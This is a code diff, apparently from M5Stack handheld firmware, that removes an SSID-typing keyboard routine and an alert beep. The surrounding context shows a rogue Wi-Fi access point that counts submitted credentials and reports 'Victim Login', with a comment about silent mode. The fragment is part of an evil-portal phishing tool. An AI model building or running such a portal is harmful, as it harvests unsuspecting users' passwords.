@@ -79,58 +79,8 @@ void setSSID(String ssid){
   return;
 }
 
-#ifdef CARDPUTER
-void confirmOrTypeSSID(){
-  DISP.fillScreen(BGCOLOR);
-  DISP.setSwapBytes(true);
-  DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.setCursor(0, 0);
-  DISP.println("  WiFi SSID  ");
-  DISP.setTextSize(TINY_TEXT);
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  DISP.println(TYPE_SSID_TEXT);
-  DISP.setTextSize(SMALL_TEXT);
-  uint8_t ssidTextCursorY = DISP.getCursorY();
-  String currentSSID = String(apSsidName.c_str());
-  DISP.printf("%s", currentSSID.c_str());
-  bool ssid_ok = false;
-
-  while(!ssid_ok){
-    M5Cardputer.update();
-    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
-      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
-      if(status.del) {
-        currentSSID.remove(currentSSID.length() - 1);
-      }
-      if(status.enter) {
-        ssid_ok = true;
-      }
-      if(currentSSID.length() >= 32) {
-        continue;
-      }
-      for(auto i : status.word) {
-        if(i != '?' && i != '$' && i != '\"' && i != '[' && i != '\\' && i != ']' && i != '+'){
-          currentSSID += i;
-        }
-      }
-      DISP.fillRect(0, ssidTextCursorY, DISP.width(), DISP.width()- ssidTextCursorY, BLACK);
-      DISP.setCursor(0, ssidTextCursorY);
-      DISP.printf("%s", currentSSID.c_str());
-    }
-  }
-
-  if(currentSSID != apSsidName && currentSSID.length() > 2){
-    setSSID(currentSSID);
-  }
-}
-#endif
-
 void setupWiFi() {
   Serial.println("Initializing WiFi");
-  #if defined(CARDPUTER)
-  confirmOrTypeSSID();
-  #endif // Cardputer
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
   WiFi.softAP(apSsidName);
@@ -296,11 +246,6 @@ void setupWebServer() {
   webServer.on("/post", []() {
     totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
-#if defined(STICK_C_PLUS)
-    SPEAKER.tone(4000, 50);
-#elif defined(CARDPUTER)
-    //SPEAKER.tone(4000, 50);     //Silent mode, just in case
-#endif
     DISP.print("Victim Login");
 #if defined(M5LED)
     blinkLed();
